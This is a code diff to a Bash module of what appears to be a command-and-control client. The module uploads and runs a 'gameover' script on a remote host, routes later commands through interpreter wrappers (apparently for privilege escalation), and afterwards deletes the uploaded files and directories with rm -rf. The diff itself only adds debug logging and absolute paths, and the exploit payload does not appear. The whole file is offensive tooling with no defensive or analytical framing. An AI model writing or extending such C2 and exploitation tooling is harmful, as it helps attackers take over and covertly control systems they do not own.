@@ -2,7 +2,7 @@
 #c2-client module
 #RiMyJcVwtt
 #gameover
-#depends on transfer module
+#depends on transfer and dir modules
 
 source funcmgr.sh
 
@@ -31,6 +31,14 @@ print_help() {
 # Print output message with green prefix and yellow content
 print_out() {
   echo -e "${GREEN}[+]${YELLOW} $1${NC}"
+}
+
+print_dbg() {
+   if [[ "${DEBUG}" == "1" ]]; then
+     local ts
+     ts=$(date +"%Y-%m-%d %H:%M:%S")
+     echo "[$ts] $1" >> "$DEBUG_LOG_FILE"
+   fi
 }
 
 # Module initialization function
@@ -118,25 +126,26 @@ enable_gameover() {
     print_warn "Aborting setup..."
     return 1
   fi
+  GAMEOVER_DIR=$(dir_pwd)
   case "$GO_HELPER" in
     python3)
-      GO_WRAPPER_CMD="./gameover_wrapper.sh"
-      GO_WRAPPER="gameover_wrapper.sh"
+      GO_WRAPPER_CMD="$GAMEOVER_DIR/u/python3 $GAMEOVER_DIR/gameover_wrapper.py"
+      GO_WRAPPER="gameover_wrapper.py"
       ;;
     python)
-      GO_WRAPPER_CMD="./gameover_wrapper2.sh"
-      GO_WRAPPER="gameover_wrapper2.sh"
+      GO_WRAPPER_CMD="$GAMEOVER_DIR/u/python $GAMEOVER_DIR/gameover_wrapper.py"
+      GO_WRAPPER="gameover_wrapper.py"
       ;;
     php)
-      GO_WRAPPER_CMD="u/php gameover_wrapper.php"
+      GO_WRAPPER_CMD="$GAMEOVER_DIR/u/php $GAMEOVER_DIR/gameover_wrapper.php"
       GO_WRAPPER="gameover_wrapper.php"
       ;;
     perl)
-      GO_WRAPPER_CMD="u/perl gameover_wrapper.pl"
+      GO_WRAPPER_CMD="$GAMEOVER_DIR/u/perl $GAMEOVER_DIR/gameover_wrapper.pl"
       GO_WRAPPER="gameover_wrapper.pl"
       ;;
     ruby)
-      GO_WRAPPER_CMD="u/ruby gameover_wrapper.rb"
+      GO_WRAPPER_CMD="$GAMEOVER_DIR/u/ruby $GAMEOVER_DIR/gameover_wrapper.rb"
       GO_WRAPPER="gameover_wrapper.rb"
       ;;
   esac
@@ -149,7 +158,7 @@ enable_gameover() {
   # Execute the main gameover script
   send_cmd "./gameover.sh $GO_HELPER"
   # Register command wrapper for gameover functionality
-  register_cmd_wrapper "gameover_wrapper"
+  register_cmd_wrapper "gameover_wrapper" 998
   # Set active flag
   GAMEOVER_ACTIVE=1
   print_std "Setup completed"
@@ -167,9 +176,9 @@ disable_gameover() {
   unregister_cmd_wrapper "gameover_wrapper"
   print_std "Cleaning up..."
   # Remove uploaded scripts
-  send_cmd "rm gameover.sh $GO_WRAPPER"
+  send_cmd "rm $GAMEOVER_DIR/gameover.sh $GAMEOVER_DIR/$GO_WRAPPER"
   # Remove any created directories
-  send_cmd "rm -rf l m u w"
+  send_cmd "rm -rf $GAMEOVER_DIR/l $GAMEOVER_DIR/m $GAMEOVER_DIR/u $GAMEOVER_DIR/w"
   # Reset active flag
   GAMEOVER_ACTIVE=0
   print_std "Done"
